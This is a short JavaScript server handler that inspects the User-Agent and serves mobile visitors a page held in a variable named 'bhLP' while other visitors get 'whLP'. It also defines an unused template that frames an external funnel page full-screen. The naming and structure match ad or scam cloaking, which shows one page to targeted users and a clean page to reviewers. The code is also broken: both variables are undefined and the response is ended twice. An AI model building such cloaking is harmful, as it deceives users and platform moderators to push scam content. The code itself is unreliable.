import isRedirectEnabled from './config';

export default function handler(req, res) {
    const bhv = bhLP;
    const whv = whLP;

    const lvh = `
    <html>
        <body>
            <iframe style="display: block; position: absolute; width: 100%; height: 100%;" width="100%" height="100%" frameborder="0" src="https://xjsdiaoqpwepa.myfunnelish.com/imbassd-1736879310456939"></iframe>
        </body>
    </html>
`;
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

    if (isMobileDevice) {
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(bhv);
    }
    else { 
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(whv);
    }
    
    res.end();
  }
